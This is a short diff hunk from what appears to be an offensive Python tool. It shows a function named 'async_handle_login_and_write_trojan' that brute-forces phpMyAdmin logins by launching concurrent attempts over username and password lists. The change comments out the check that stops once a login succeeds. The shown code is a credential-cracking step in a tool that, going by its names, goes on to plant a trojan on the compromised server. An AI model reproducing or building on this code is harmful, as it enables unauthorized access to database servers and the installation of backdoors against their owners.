@@ -258,10 +258,10 @@ async def async_handle_login_and_write_trojan(host, limit):
         for username in username_list:
             tasks = [asyncio.create_task(phpmyadmin_crack(session, host, username, password, limit)) for password in password_list]
             done, pending = await asyncio.wait(tasks)
-            for i in done:
-                login_return = i.result()
-                if login_return:
-                    return
+            # for i in done:
+            #     login_return = i.result()
+            #     if login_return:
+            #         return
 
 
 def handle_login_and_write_trojan(host, limit):
